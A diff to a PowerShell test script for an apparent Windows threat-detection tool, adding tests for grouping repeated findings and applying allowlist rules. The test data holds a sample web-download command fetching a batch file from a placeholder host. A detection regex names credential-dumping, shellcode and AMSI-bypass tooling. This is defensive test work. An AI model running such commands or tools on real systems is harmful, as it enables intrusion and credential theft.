@@ -73,6 +73,30 @@ Assert-WD (Test-WDSelfPath 'C:\Users\X\Downloads\WindowsDetective-main (1)\lib\W
 $script:WD.Findings.Clear(); $script:WD.FindingIndex.Clear(); $script:WD.Timeline.Clear()
 Assert-WD ((Get-WDFileInfo 'C:\Program Files\x\Update.exe"" \c').Exists -eq $false) 'malformed path handled without error'
 
+# ---- grouping of repeated events and allowlist
+$script:WD.Findings.Clear(); $script:WD.FindingIndex.Clear()
+foreach ($n in 4309, 5800, 11098) { Add-Finding -Severity Medium -Category 'Execution' -Title 'PowerShell web download' -Evidence "powershell -c iwr https://example.test/a.bat -OutFile C:\Temp\ttk_update_$n.bat" }
+Add-Finding -Severity Medium -Category 'Network' -Title 'Connection' -Evidence '203.0.113.166:443'
+Add-Finding -Severity Medium -Category 'Network' -Title 'Connection' -Evidence '203.0.113.167:443'
+Assert-WD (@($script:WD.Findings | Where-Object { $_.Title -eq 'PowerShell web download' }).Count -eq 1 -and ($script:WD.Findings | Where-Object { $_.Title -eq 'PowerShell web download' }).Occurrences -eq 3) 'events differing only in random numbers are grouped'
+Assert-WD (@($script:WD.Findings | Where-Object { $_.Title -eq 'Connection' }).Count -eq 2) 'different IP addresses are not grouped'
+$alTmp = Join-Path ([IO.Path]::GetTempPath()) 'wd_allowlist_test.txt'
+Set-Content -LiteralPath $alTmp -Value @('# comment', 'path:C:\Users\*\AppData\Local\Temp\ttk_mon_*.ps1 | my toolkit', 'text:*updates-cdn.bravesoftware.com/*', 'E6AB8385010B3407221E4BD3E54417DCABD487E4E88D1F7A9425DAAC5F8DF3F2')
+Assert-WD ((Import-WDAllowlist $alTmp) -eq 3) 'allowlist rules loaded'
+Add-Finding -Severity High -Category 'Files' -Title 'Script dropped' -Evidence 'C:\Users\X\AppData\Local\Temp\ttk_mon_828.ps1 | sha256 x'
+$al = $script:WD.Findings | Where-Object { $_.Title -eq 'Script dropped' }
+Assert-WD ($al.Severity -eq 'Info' -and $al.Allowlisted -and $al.OriginalSeverity -eq 'High' -and $al.Detail -match 'ALLOWLISTED') 'allowlisted finding downgraded to Info and labelled'
+Add-Finding -Severity Critical -Category 'Files' -Title 'Script dropped' -Evidence 'C:\Users\X\AppData\Local\Temp\ttk_mon_999.ps1 | sha256 x'
+Assert-WD ($al.Severity -eq 'Info' -and $al.Occurrences -eq 2) 'repeat of allowlisted finding is not re-escalated'
+Add-Finding -Severity High -Category 'Files' -Title 'Other' -Evidence 'C:\x\a.exe sha256 E6AB8385010B3407221E4BD3E54417DCABD487E4E88D1F7A9425DAAC5F8DF3F2'
+Assert-WD (($script:WD.Findings | Where-Object { $_.Title -eq 'Other' }).Allowlisted) 'hash allowlist rule'
+Add-Finding -Severity High -Category 'Files' -Title 'Unrelated' -Evidence 'C:\Users\X\Downloads\evil.exe'
+Assert-WD (($script:WD.Findings | Where-Object { $_.Title -eq 'Unrelated' }).Severity -eq 'High') 'non-matching finding untouched'
+Remove-Item -LiteralPath $alTmp -Force
+$shipped = Import-WDAllowlist (Join-Path $root 'iocs/allowlist.txt')
+Assert-WD ($shipped -ge 5) 'shipped allowlist parses'
+$script:WD.Allowlist.Clear(); $script:WD.Findings.Clear(); $script:WD.FindingIndex.Clear(); $script:WD.Timeline.Clear()
+
 # ---- tool code must not embed attack keywords that make antivirus (AMSI) block it
 $bait = '(?i)(mimi' + 'katz|sekur' + 'lsa|cobalt' + 'strike|cobalt strike|download' + 'string|amsi' + 'utils|amsiinit' + 'failed|virtual' + 'alloc|invoke-' + 'shellcode)'
 foreach ($f in @(Get-ChildItem (Join-Path $root 'lib') -Filter *.ps1) + @(Get-Item (Join-Path $root 'WindowsDetective.ps1'))) {
